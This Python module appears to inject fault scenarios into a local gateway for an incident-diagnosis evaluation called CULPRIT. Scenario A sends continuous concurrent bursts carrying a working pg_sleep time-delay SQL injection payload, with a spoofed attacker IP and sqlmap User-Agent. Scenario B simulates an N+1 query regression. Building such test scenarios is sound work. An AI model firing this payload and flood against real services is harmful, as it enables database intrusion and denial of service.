"""
scenarios.inject – Scenario injection runner for CULPRIT evaluations.

Scenario A (Exploit):
  Sends a continuous burst to POST /api/orders via gateway with a time-delay SQLi payload
  in `sku` from a single attacker IP.
  Payload: WIDGET-001' AND (SELECT 1 FROM pg_sleep(5)) IS NOT NULL; --
  Effect: Raises orders p95 latency to ~5s and exhausts DB pool connections.

Scenario B (Regression):
  Shifts gateway weights to 100% blue (v1.5.0).
  Sends batch multi-item orders triggering N+1 unindexed inventory queries.
  Effect: Connection pool contention slows down both /api/orders and /api/products.
"""

import concurrent.futures
import json
import os
import sys
import threading
import time
from typing import Any, Dict, List
import requests

DEFAULT_GATEWAY_URL = os.environ.get("GATEWAY_URL", "http://localhost:8080")
_scenario_running = False
_worker_thread = None


def start_scenario_a(
    gateway_url: str = DEFAULT_GATEWAY_URL,
    burst_count: int = 4,
    sleep_delay: int = 5,
    attacker_ip: str = "198.51.100.42",
) -> Dict[str, Any]:
    """Inject Scenario A: SQLi time-delay attack burst into Docker gateway asynchronously."""
    global _scenario_running, _worker_thread
    _scenario_running = True
    print(f"[Scenario A] Starting async exploit injection against {gateway_url}...")
    url = f"{gateway_url.rstrip('/')}/api/orders"
    sqli_payload = f"WIDGET-001' AND (SELECT 1 FROM pg_sleep({sleep_delay})) IS NOT NULL; --"
    headers = {
        "Content-Type": "application/json",
        "X-Forwarded-For": attacker_ip,
        "User-Agent": "sqlmap/1.7.2#stable",
    }
    body = {
        "customer_id": 1,
        "sku": sqli_payload,
        "qty": 1,
    }

    def _attack_worker():
        pool = concurrent.futures.ThreadPoolExecutor(max_workers=burst_count)
        while _scenario_running:
            try:
                # Concurrent burst
                futures = [
                    pool.submit(requests.post, url, json=body, headers=headers, timeout=sleep_delay + 3)
                    for _ in range(burst_count)
                ]
                # Wait briefly then repeat if still running
                time.sleep(1.0)
            except Exception:
                pass
        pool.shutdown(wait=False)

    _worker_thread = threading.Thread(target=_attack_worker, daemon=True)
    _worker_thread.start()

    return {
        "scenario": "a_exploit",
        "burst_count": burst_count,
        "sleep_delay": sleep_delay,
        "attacker_ip": attacker_ip,
        "status": "running",
    }


def start_scenario_b(
    gateway_url: str = DEFAULT_GATEWAY_URL,
    num_requests: int = 15,
) -> Dict[str, Any]:
    """Inject Scenario B: 100% blue routing + multi-item N+1 order traffic asynchronously."""
    global _scenario_running, _worker_thread
    _scenario_running = True
    print(f"[Scenario B] Starting async regression traffic against {gateway_url}...")

    # Shift traffic to 100% blue
    base = gateway_url.rstrip("/")
    try:
        requests.post(f"{base}/admin/weights", json={"blue": 100, "green": 0}, timeout=5)
    except Exception:
        pass

    orders_url = f"{base}/api/orders"
    products_url = f"{base}/api/products"

    multi_items = [
        {"sku": f"SKU-{i:03d}", "qty": 1}
        for i in range(1, 11)
    ]
    body = {
        "customer_id": 2,
        "sku": "WIDGET-001",
        "qty": 1,
        "items": multi_items,
    }

    def _loop_b():
        count = 0
        pool = concurrent.futures.ThreadPoolExecutor(max_workers=4)
        while _scenario_running:
            try:
                if count % 2 == 0:
                    pool.submit(requests.get, products_url, timeout=6)
                else:
                    pool.submit(requests.post, orders_url, json=body, timeout=8)
                count += 1
            except Exception:
                pass
            time.sleep(1.0)
        pool.shutdown(wait=False)

    _worker_thread = threading.Thread(target=_loop_b, daemon=True)
    _worker_thread.start()

    return {
        "scenario": "b_regression",
        "requests_sent": num_requests,
        "status": "running",
    }


def reset_scenario(gateway_url: str = DEFAULT_GATEWAY_URL) -> Dict[str, Any]:
    """Reset gateway weights to 50/50 and remove all block rules."""
    global _scenario_running
    _scenario_running = False
    base = gateway_url.rstrip("/")
    try:
        requests.post(f"{base}/admin/weights", json={"blue": 50, "green": 50}, timeout=5)
        state = requests.get(f"{base}/admin/state", timeout=5).json()
        for rule in state.get("rules", []):
            requests.delete(f"{base}/admin/rules/{rule['id']}", timeout=5)
        for route in state.get("disabled_routes", []):
            requests.post(f"{base}/admin/enable", json={"route": route}, timeout=5)
    except Exception as exc:
        print(f"Reset warning: {exc}")
    return {"status": "reset", "weights": {"blue": 50, "green": 50}}


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "a"
    gw = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_GATEWAY_URL
    if mode == "a":
        start_scenario_a(gw)
    elif mode == "b":
        start_scenario_b(gw)
    elif mode == "reset":
        reset_scenario(gw)
    else:
        print("Usage: python -m scenarios.inject [a|b|reset]")
